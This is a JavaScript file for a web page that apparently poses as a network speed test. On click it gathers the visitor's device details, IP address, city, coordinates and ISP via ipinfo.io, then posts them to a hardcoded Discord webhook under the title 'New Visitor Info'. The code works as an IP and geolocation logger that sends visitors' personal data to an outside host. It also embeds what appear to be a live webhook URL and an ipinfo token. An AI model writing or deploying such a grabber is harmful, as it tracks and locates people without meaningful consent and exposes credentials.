
// --- CONFIG ---
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415394791654428856/0uncp10Lr772qmkanZ4aKAGYo63UdG9XnW32s0UA2CrXXx8ZiubzteQiBxxAgVrAvoTg";
const IPINFO_TOKEN = "3993cbc08215b2"; // replace with your ipinfo.io token

// --- utility ---
function safeStringify(obj) {
  try { return JSON.stringify(obj, null, 2); } catch (e) { return String(obj); }
}
const statusEl = () => document.getElementById('status');
const outputEl = () => document.getElementById('output');
const spinner = () => document.getElementById('spinner');
const btn = document.getElementById('logBtn');

function showSpinner(show) {
  spinner().style.display = show ? 'block' : 'none';
}

// Collect client info + device details
function collectClientInfo() {
  const client = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent || null,
    language: navigator.language || null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    screen: (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null,
    platform: navigator.platform || null,
    deviceMemory: navigator.deviceMemory || "unknown",
    cpuCores: navigator.hardwareConcurrency || "unknown",
    touchSupport: navigator.maxTouchPoints || 0
  };
  if (navigator.userAgentData) {
    client.userAgentData = {
      mobile: navigator.userAgentData.mobile,
      brands: navigator.userAgentData.brands
    };
  }
  return client;
}

// Fetch IP + geolocation from ipinfo.io with fallback
async function fetchGeo() {
  try {
    const url = `https://ipinfo.io/json?token=${IPINFO_TOKEN}`;
    const res = await fetch(url, { cache: 'no-store' });
    if (!res.ok) throw new Error('Geo API error: ' + res.status);
    return await res.json();
  } catch (err) {
    console.warn("Geo fetch failed:", err.message);
    return { ip: "unknown", city: "unknown", region: "unknown", country: "unknown", loc: null, org: "unknown" };
  }
}

// --- Network tests ---
async function testPing() {
  const url = "https://www.cloudflare.com/cdn-cgi/trace";
  const attempts = 3;
  let times = [];
  for (let i = 0; i < attempts; i++) {
    const start = performance.now();
    await fetch(url, { cache: "no-store" });
    times.push(performance.now() - start);
  }
  const avg = times.reduce((a,b) => a+b,0) / times.length;
  return Math.round(avg);
}

async function testDownload() {
  const url = "./testfile.bin"; // local file hosted in repo
  const start = performance.now();
  const res = await fetch(url, { cache: "no-store" });
  const blob = await res.blob();
  const end = performance.now();
  const seconds = (end - start) / 1000;
  const mbps = (blob.size * 8 / 1_000_000) / seconds;
  return mbps.toFixed(2);
}

// Send results to Discord
async function sendToDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('XXXX')) {
    console.warn('Webhook not set, skipping.');
    return { skipped: true };
  }
  const body = {
    content: '```json\n' + safeStringify(payload) + '\n```',
    embeds: [{
      title: 'New Visitor Info',
      color: 3447003,
      fields: [
        { name: 'IP', value: payload.ip || 'n/a', inline: true },
        { name: 'Country', value: payload.country || 'n/a', inline: true },
        { name: 'City', value: payload.city || 'n/a', inline: true },
        { name: 'Ping (ms)', value: String(payload.ping || 'n/a'), inline: true },
        { name: 'Download (Mbps)', value: String(payload.downloadMbps || 'n/a'), inline: true },
        { name: 'Device RAM (GB)', value: String(payload.deviceMemory || 'n/a'), inline: true },
        { name: 'CPU Cores', value: String(payload.cpuCores || 'n/a'), inline: true }
      ],
      timestamp: new Date().toISOString()
    }]
  };
  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  if (!res.ok) throw new Error('Webhook returned ' + res.status);
  return { success: true };
}

// --- Main flow ---
btn.addEventListener('click', async () => {
  btn.disabled = true;
  showSpinner(true);
  statusEl().textContent = 'Collecting...';
  try {
    const client = collectClientInfo();
    statusEl().textContent = 'Fetching IP & geo...';
    const geo = await fetchGeo();
    statusEl().textContent = 'Testing ping...';
    const ping = await testPing();
    statusEl().textContent = 'Testing download speed...';
    const downloadMbps = await testDownload();
    const [lat, lon] = geo.loc ? geo.loc.split(",") : [null, null];
    const full = Object.assign({}, client, {
      ip: geo.ip || null,
      city: geo.city || null,
      region: geo.region || null,
      country: geo.country || null,
      latitude: lat,
      longitude: lon,
      isp: geo.org || null,
      ping,
      downloadMbps,
      geo_raw: geo
    });
    outputEl().textContent = safeStringify(full);
    statusEl().textContent = 'Sending to Discord...';
    const sendRes = await sendToDiscord(full);
    if (sendRes.skipped) {
      statusEl().textContent = 'Done — webhook not set.';
    } else {
      statusEl().textContent = 'Done — sent to Discord.';
    }
  } catch (err) {
    console.error(err);
    statusEl().textContent = 'Error: ' + err.message;
    outputEl().textContent = 'Error: ' + err.message;
  } finally {
    btn.disabled = false;
    showSpinner(false);
  }
});
